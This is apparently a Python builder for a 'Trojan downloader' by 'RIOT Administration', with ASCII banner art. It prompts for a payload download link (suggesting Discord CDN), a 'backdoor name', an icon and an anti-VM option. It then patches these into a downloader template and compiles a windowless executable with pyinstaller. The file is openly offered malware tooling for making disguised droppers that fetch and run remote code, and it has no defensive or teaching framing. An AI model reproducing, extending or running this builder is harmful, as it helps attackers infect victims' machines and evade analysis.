import colorama
import os
import shutil

from termcolor import colored
from colorama import Fore

colorama.init()
    

art = """


     .... NO! ...                  ... MNO! ...                          ▄▄▄█████▓ ██▀███   ▒█████   ▄▄▄██▀▀▀▄▄▄       ███▄    █             
   ..... MNO!! ...................... MNNOO! ...                         ▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒   ▒██  ▒████▄     ██ ▀█   █           
 ..... MMNO! ......................... MNNOO!! .                         ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒   ░██  ▒██  ▀█▄  ▓██  ▀█ ██▒      
.... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .                          ░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░▓██▄██▓ ░██▄▄▄▄██ ▓██▒  ▐▌██▒        
 ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....                             ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░ ▓███▒   ▓█   ▓██▒▒██░   ▓██░      
    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...                               ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ▒▓▒▒░   ▒▒   ▓▒█░░ ▒░   ▒ ▒           
   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....                                ░      ░▒ ░ ▒░  ░ ▒ ▒░  ▒ ░▒░    ▒   ▒▒ ░░ ░░   ░ ▒░     
   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...                                ░        ░░   ░ ░ ░ ░ ▒   ░ ░ ░    ░   ▒      ░   ░ ░          
    ....... MMMMM..    OPPMMP    .,OMI! ....                                         ░         ░ ░   ░   ░        ░  ░         ░               
     ...... MMMM::   o.,OPMP,.o   ::I!! ...
         .... NNM:::.,,OOPM!P,.::::!! ....
          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....                               ▓█████▄  ▒█████   █     █░███▄    █  ██▓     ▒█████   ▄▄▄      ▓█████▄ ▓█████  ██▀███  
         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....                                ▒██▀ ██▌▒██▒  ██▒▓█░ █ ░█░██ ▀█   █ ▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
           .. MMMMMNNOOMMNNIIIPPPOO!! ......                               ░██   █▌▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌▒███   ▓██ ░▄█ ▒
          ...... MMMONNMMNNNIIIOO!..........                               ░▓█▄   ▌▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  
       ....... MN MOMMMNNNIIIIIO! OO ..........                            ░▒████▓ ░ ████▓▒░░░██▒██▓▒██░   ▓██░░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ ░▒████▒░██▓ ▒██▒
    ......... MNO! IiiiiiiiiiiiI OOOO ...........                           ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒ ░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........                         ░ ▒  ▒   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........                          ░ ░  ░ ░ ░ ░ ▒    ░   ░    ░   ░ ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░    ░     ░░   ░ 
   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........                              ░        ░ ░      ░            ░     ░  ░    ░ ░        ░  ░   ░       ░  ░   ░     
      ...... OO! ................. ON! .......                              ░                                                              ░           
         ................................

"""

def printart():
    print(colored(art, 'blue'))

def cls():
    os.system("cls")

def pause():
    os.system("pause")

#######

class start_build():
    def __init__(self, icon="exeic.ico", name="Trojan-downloader", downloadurl="", antivm = False) -> None:
        if icon == "":
            self.icon = "exeic.ico"
        else:
            self.icon = icon

        self.name = name
        self.downloadurl = downloadurl
        self.antivm = antivm

        if os.path.exists("downloader-initialization.py"):
            os.remove("downloader-initialization.py")
        if os.path.exists("build"):
            shutil.rmtree("build")
        if os.path.exists(f"downloader-initialization.spec"):
            os.remove(f"downloader-initialization.spec")
        if os.path.exists(f"dist\\{self.name}.exe"):
            shutil.copy(f"dist\\{self.name}.exe", "")
            shutil.rmtree("dist")
        if os.path.exists(f"{self.name}.spec"):
            os.remove(f"{self.name}.spec")

        cls()
        printart()
        confirm = input(f"{Fore.MAGENTA}Confirm build (Y/N) {Fore.WHITE}")
        if confirm.lower() == "y":
            self.setup()
        else:
            os._exit(0)

    def setup(self):

        shutil.copy("downloader.py", "downloader-initialization.py")
        content = ""
        with open("downloader-initialization.py", "r") as f:
            content = f.read()
        
        newcontent = content.replace("{downloadurl}", self.downloadurl)
        newcontent = newcontent.replace('"{antivm}"', str(self.antivm))

        with open("downloader-initialization.py", "w") as f:
            f.write(newcontent)

        self.build()

    def build(self):
        command = "pyinstaller --noconsole --onefile "

        if self.icon != "":
            command += f'--icon="{self.icon}" '

        command += f'-n="{self.name}" downloader-initialization.py'
        print(command)
        os.system(command)
        print(f"\n{Fore.BLUE}Successfully built a trojan downloader.")
        if os.path.exists("build"):
            shutil.rmtree("build")
        if os.path.exists(f"downloader-initialization.spec"):
            os.remove(f"downloader-initialization.spec")
        if os.path.exists(f"dist\\{self.name}.exe"):
            shutil.copy(f"dist\\{self.name}.exe", f"{self.name}.exe")
            shutil.rmtree("dist")
        if os.path.exists("downloader-initialization.py"):
            os.remove("downloader-initialization.py")
        if os.path.exists(f"{self.name}.spec"):
            os.remove(f"{self.name}.spec")
        pause()


def main():
    cls()
    os.system("mode con:cols=173 lines=36")
    printart()
    os.system("title Trojan Downloader by RIOT Administration")

    icon = input(f"{Fore.MAGENTA}Icon path (icon.ico) (empty for none) {Fore.WHITE}")

    directlink = input(f"{Fore.MAGENTA}Direct download link (cdn.discordapp.com/file.exe, etc) {Fore.WHITE}")
    name = input(f"{Fore.MAGENTA}Backdoor name {Fore.WHITE}")
    antivminput = input(f"{Fore.MAGENTA}Anti VM (Y/N) {Fore.WHITE}")
    if antivminput.lower == "y":
        antivm = True
    else:
        antivm = False

    start_build(icon=icon, name=name, downloadurl=directlink, antivm=antivm)


if __name__ == '__main__':
    main()